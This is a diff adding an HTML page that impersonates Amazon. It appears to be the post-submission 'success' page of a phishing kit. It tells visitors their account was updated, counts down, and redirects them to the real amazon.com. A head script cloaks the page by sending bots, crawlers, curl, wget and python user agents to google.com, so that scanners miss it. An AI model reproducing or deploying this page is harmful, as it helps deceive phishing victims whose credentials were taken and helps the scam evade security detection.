@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="success.css">
+</head>
+<body>
+    <div id="passage">
+        <span>Your Account Has Been Updated Successfully</span>
+    </div>
+    <div id="formsContainer">
+        <div class="emiContainer">  
+            <h2>Congratulations</h2>
+            <img src="images/img8.png" alt="Congratulations">
+        </div>
+        <div class="thanks">
+            You can now enjoy our services.<br>
+            Thanks for choosing our trusted services.<br>
+            Your account will be verified and updated in the next 24 hours.
+        </div>
+        <div class="countdown">
+            You are being redirected to your account in <span id="countdown">10</span> seconds...
+        </div>
+    </div> 
+
+    <script>
+        function startCountdown() {
+            let seconds = 10;
+            const countdownElement = document.getElementById('countdown');
+
+            const interval = setInterval(() => {
+                countdownElement.textContent = seconds;
+                seconds--;
+
+                if (seconds < 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://www.amazon.com';
+                }
+            }, 1000);
+        }
+
+        window.onload = startCountdown;
+    </script>
+</body>
+</html>
